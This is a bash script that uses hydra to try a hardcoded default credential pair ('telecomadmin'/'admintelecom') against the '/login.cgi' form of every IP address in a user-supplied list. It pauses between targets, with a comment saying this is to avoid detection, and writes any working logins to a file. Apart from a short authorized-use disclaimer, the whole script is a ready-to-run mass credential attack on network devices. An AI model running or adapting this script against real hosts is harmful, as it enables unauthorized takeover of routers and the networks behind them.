#!/bin/bash

#Global Vars
input_file_name=null
username="telecomadmin"
password="admintelecom"

extract_credentials(){
    echo -e "\n[INFO] Extracting obtained credentials"
    file_name="${input_file_name%_*}"
    file_name+="_extracted-http-login-credentials.txt" #concatenates the suffix to the name
    
    grep "host:" *bruteforce-results.txt | awk '{printf("%s %s:%s\n"), $3, $5, $7}' - > $file_name
#    rm -rf *bruteforce-results.txt
    echo "[INFO] Extraction done"
}

run_exploit(){
    pause=5
    echo "[INFO] Running the brute force"
    while IFS= read -r line; do #loop based on: https://stackoverflow.com/questions/10929453/read-a-file-line-by-line-assigning-the-value-to-a-variable
        ip=$line
        output_file_name="${input_file_name%_*}"
        output_file_name+="_${ip}_bruteforce-results.txt" #concatenates the suffix to the name
        hydra $ip -l $username -p $password http-form-post "/login.cgi:txt_Username=^USER^&pass=^PASS^:Please try again" -T 1 -t 1 -o $output_file_name -q 1>/dev/null
        echo "[INFO] Target $ip finished. Sleeping for $pause seconds..."
        sleep $pause #pauses for n seconds (to avoid detection/block)
    done < $input_file_name
    echo "[INFO] Brute force done"
}

menu(){
    echo "[INFO] You are about to run a brute force attack"
    echo "[WARN] Please, only use it on networks you have authorization to do so"
    echo "[WARN] Do NOT use it to any illegal activity"
    echo "[WARN] You are subject to local laws"
    echo "Press ENTER to accept this terms and continue..."
    read input_start

    if [[ -n "$input_start" ]]
    then
        exit
    fi
    echo "Please, enter the file name containing the target IPs"
    echo -n ">> "
    read f_name_in
    input_file_name=$f_name_in
    
    run_exploit
    extract_credentials
}

#Execution
menu
exit #calls clean exit
